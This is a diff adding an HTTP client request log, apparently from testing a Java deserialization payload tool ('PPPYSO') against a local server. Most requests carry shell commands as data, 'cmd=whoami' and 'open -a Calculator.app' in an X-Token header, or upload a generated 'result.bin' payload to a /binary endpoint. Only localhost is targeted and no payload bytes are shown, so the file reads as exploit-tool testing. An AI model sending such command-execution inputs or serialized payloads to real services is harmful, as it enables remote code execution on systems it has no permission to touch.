@@ -1,0 +1,756 @@
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+<> 2024-01-15T224455.200.txt
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15873
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15849
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15849
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+<> 2024-01-15T133329.200.txt
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+<> 2024-01-15T133324.200.txt
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15785
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15725
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+GET http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+GET http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15849
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15713
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15713
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15849
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15809
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15681
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15939
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 16003
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 16003
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 16015
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+<> 2024-01-15T103301.200.txt
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+<> 2024-01-15T103257.200.txt
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: open -a Calculator.app
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+<> 2024-01-15T103233.200.txt
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+<> 2024-01-15T103217.200.txt
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 16193
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/base64
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+cmd=whoami
+
+<> 2024-01-15T103126.200.txt
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 16209
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
+POST http://127.0.0.1:8080/binary
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 15847
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.7)
+Accept-Encoding: br,deflate,gzip,x-gzip
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="result.bin"
+Content-Type: application/octet-stream
+
+< /Users/ppp/Documents/pppRepository/github_file/PPPYSO/result.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+###
+
